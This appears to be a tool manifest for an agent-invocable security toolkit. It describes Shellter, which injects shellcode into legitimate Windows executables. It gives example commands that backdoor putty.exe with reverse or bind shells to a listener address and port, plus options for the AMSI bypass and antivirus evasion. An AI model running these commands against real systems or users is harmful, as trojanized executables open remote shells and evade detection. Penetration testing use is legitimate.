---
id: security-exploit-shellter
namespace: security:exploit:shellter
name: shellter
description: Dynamic shellcode injection tool for creating backdoored portable executables while maintaining original functionality.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - shellcode.injection
  - pe.backdooring
  - av.evasion
  - payload.embedding
platforms:
  - linux
  - macos
  - cross-platform
risk_level: high
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies:
  - wine
related_tools:
  - veil
  - metasploit
  - msfvenom
workflow_edges:
  produces:
    - backdoored-pe
    - injected-shellcode
  consumes:
    - target-pe
    - shellcode-payload
    - lhost
    - lport
contract:
  inputs:
    - type: file.pe
      description: Target Windows PE file to backdoor
    - type: shellcode.binary
      description: Shellcode to inject (or auto-generate)
    - type: network.lhost
      description: Listener IP for reverse shell
    - type: network.lport
      description: Listener port for reverse shell
  outputs:
    - type: file.pe.backdoored
      description: Backdoored PE file
      mime: application/octet-stream
  side_effects:
    - filesystem_write
  resource_cost:
    cpu: medium
    memory_mb: 256
    network: low
    disk_io: medium
resource_profile:
  cpu: medium
  memory_mb: 256
  network: low
  disk_io: medium
allowed-tools:
  - shellter
  - Bash
  - execFile
parameters:
  - name: flag-pe
    type: string
    required: false
    description: "Target PE file path"
    aliases:
      - --pe
  - name: flag-shellcode
    type: string
    required: false
    description: "Custom shellcode file"
    aliases:
      - --shellcode
  - name: reverse-ip
    type: string
    required: false
    description: "Reverse shell IP"
    aliases:
      - --reverse-ip
  - name: reverse-port
    type: integer
    required: false
    description: "Reverse shell port"
    aliases:
      - --reverse-port
  - name: bind-port
    type: integer
    required: false
    description: "Bind shell port"
    aliases:
      - --bind-port
  - name: flag-o
    type: string
    required: false
    description: "Output file path"
    aliases:
      - -o
      - --output
  - name: flag-m
    type: string
    required: false
    description: "Mode (auto/manual)"
    aliases:
      - -m
      - --mode
  - name: flag-no-amsi
    type: boolean
    required: false
    description: "Disable AMSI bypass"
    aliases:
      - --no-amsi
  - name: flag-quiet
    type: boolean
    required: false
    description: "Quiet output mode"
    aliases:
      - --quiet
  - name: flag-v
    type: boolean
    required: false
    description: "Verbose output"
    aliases:
      - -v
      - --verbose
execution:
  template: "shellter --pe {target-exe}"
  sandbox: execFile
  timeout_seconds: 300
  shell: false
global_vars:
  target-exe: "/path/to/putty.exe"
  lhost: "10.0.0.1"
  lport: "4444"
examples:
  - description: "Auto-backdoor a PE with reverse shell"
    command: shellter --pe putty.exe --reverse-ip 10.0.0.1 --reverse-port 4444 -m auto
  - description: "Manual mode for custom injection"
    command: shellter --pe putty.exe -m manual
  - description: "Inject custom shellcode"
    command: shellter --pe putty.exe --shellcode shellcode.bin
  - description: "Backdoor with bind shell"
    command: shellter --pe putty.exe --bind-port 4444 -m auto
  - description: "Quiet mode with custom output"
    command: shellter --pe putty.exe --reverse-ip 10.0.0.1 --reverse-port 4444 -o backdoor.exe --quiet
  - description: "Backdoor with AMSI disabled"
    command: shellter --pe putty.exe --reverse-ip 10.0.0.1 --reverse-port 4444 --no-amsi
references:
  - label: "Shellter GitHub"
    url: "https://github.com/ryank231231/shellter"
  - label: "Shellter Project"
    url: "https://www.shellterproject.com/"
phase: exploitation
techniques:
  - execution
  - execution
  - command-and-control
items:
  - NoCreds
  - Hash
services: []
attack_types:
  - Exploitation
---
# Shellter — Dynamic Shellcode Injection

Shellter is a dynamic shellcode injection tool that creates backdoored versions of legitimate Windows Portable Executable (PE) files while preserving their original functionality. It works by injecting shellcode into the target PE at runtime, enabling AV evasion.

## Key Features

- **PE backdooring**: Inject shellcode into legitimate executables
- **Auto mode**: Fully automated shellcode injection
- **Manual mode**: Fine-grained control over injection process
- **AV evasion**: Bypass common anti-virus signatures
- **Original functionality**: Backdoored executables work as normal
- **Multiple payloads**: Reverse shell, bind shell, meterpreter, custom shellcode
